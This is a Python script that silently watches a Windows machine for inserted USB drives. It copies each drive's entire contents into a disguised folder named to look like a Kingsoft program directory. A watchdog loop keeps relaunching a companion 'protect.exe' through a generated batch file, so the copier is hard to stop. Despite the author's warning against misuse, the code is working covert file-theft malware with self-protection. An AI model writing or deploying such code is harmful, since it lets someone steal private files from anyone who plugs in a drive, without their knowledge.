# -*- coding : utf-8 -*-
# Writer: Skyler
# Date: Friday 2021/4/2
# Warning: Never use it to do bad things!!!
import os
import shutil
import threading
import time
import psutil

#==============================================================================
# def function


os.system('cd .>historyUSB.txt')
with open('historyUSB.txt', mode='w') as f:
    f.write("None")

# check USB disk
def UCheck():
    while True:
        try:
            # create log file
            with open("INFO_log.txt", mode="a") as file:
                # write date to log file
                file.write(time_now() + "\n")

            for devices in psutil.disk_partitions():
                # wrire log to log file
                # create log file
                with open("INFO_log.txt", mode="a") as file:
                    # write information
                    file.write(str(devices) + "\n")

                # if USB disk is put in
                if "removable" in devices.opts:

                    U_path = devices.mountpoint
                    letter_l = []
                    for letter_u_path in U_path:
                        letter_l.append(letter_u_path)

                    # get USB name
                    os.system("vol " + letter_l[0] + ": >device_u.txt")
                    # with open("device_u.txt", encoding = "unicode_escape") as u_name_file:
                    with open("device_u.txt", encoding = "gbk") as u_name_file:
                        uNameL = u_name_file.readlines()

                    order = 0
                    uRealName = []
                    for letter_u_name_l in uNameL[0]:
                        order += 1
                        if order >= 13:
                            uRealName.append(letter_u_name_l)

                    uRealName.pop(-1)
                    # USB name
                    u_real_name = "".join(uRealName)

                    # check if USB repeat
                    # with open('historyUSB.txt', encoding='unicode_escape') as f:
                    with open('historyUSB.txt', encoding='gbk') as f:
                        try:
                            end = f.readlines()[-1]
                            print(end)
                            if (u_real_name != end) or (end == "None"):
                                with open('historyUSB.txt', mode='a') as hist:
                                    hist.write(" \n" + u_real_name)
                                    # copy
                                    u_copy_process(U_path, CP_GPS + u_real_name + time_now())
                            elif u_real_name == end:
                                continue

                        except:
                            raise

        finally:
            time.sleep(5)

# copy USB file
def u_copy(u_gps, copy_gps):
    shutil.copytree(u_gps, copy_gps)

# USB copy thread
def u_copy_process(u_path, CP_path):
    u_cp_process = threading.Thread(target = u_copy(u_path, CP_path), daemon = True)
    u_cp_process.start()


# time
def time_now():
    DATE_NOW = time.strftime("%Y") + "-" + time.strftime("%m") + "-" + time.strftime("%d")
    time_here = time.strftime("%H") + "_" + time.strftime("%M") + "_" + time.strftime("%S")
    Now = DATE_NOW + "---" + time_here
    return Now



#==============================================================================



HARDWARE = []
# write hardware information
with open("Hardware_log.txt", "w") as File:
    for hardware in psutil.disk_partitions():
        if "fixed" in hardware.opts:
            File.write(str(hardware) + "\n")
            HARDWARE.append(hardware.mountpoint)

# copy file to
for ai in HARDWARE[-1]:
    CP_GPS = ai + ":/Program-files (X86)/Kingsoftt/U_secret_ps/"
    break


# start check USB thread
u_check_process = threading.Thread(target = UCheck, daemon = True)
u_check_process.start()


# take a note for thread pid
with open("protect\pid_main.txt", mode = "w") as pid_main:
    pid_main.write(str(os.getpid()))



# protect thread
def protect_start():
    with open("protect_start.bat", mode = "w") as protect_start:
        protect_start.write("@ECHO OFF\n")
        protect_start.write("cd protect\n")
        protect_start.write("start protect.exe\n")
        protect_start.write("exit")

    os.system("start protect_start.bat")


while True:
    # get thread pid
    try:
        with open("protect\pid_protect.txt") as pid_protect:
            Pid_protect = pid_protect.readlines()[0]

        # check if protect is still running
        if int(Pid_protect) not in psutil.pids():
            protect_start()
            with open("protect\pid_protect.txt", mode = "w") as A:
                pass

    except:
        protect_start()
        pass

    finally:
        time.sleep(3)
